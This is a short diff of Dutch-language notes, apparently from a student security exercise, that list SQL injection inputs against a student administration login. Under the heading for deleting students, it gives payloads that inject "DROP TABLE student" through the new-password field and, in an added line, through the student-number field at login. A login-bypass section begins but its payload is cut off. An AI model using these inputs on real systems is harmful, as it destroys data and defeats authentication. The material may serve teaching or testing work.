@@ -1,6 +1,8 @@
 verwijder studenten: 
-	-	Voer bij nieuw wachtwoord bij wachtwoord wijzigen:
+	-	Voer bij nieuw wachtwoord bij wachtwoord wijzigen:		
 		1234'; DROP TABLE student;
+		Bij inloggen bij studentnummer invullen:
+		1876814'; DROP TABLE student; --
 	
 by-pass login:
 	-	Voer eerst bij login een studentenummer in en dan bij wachtwoord:
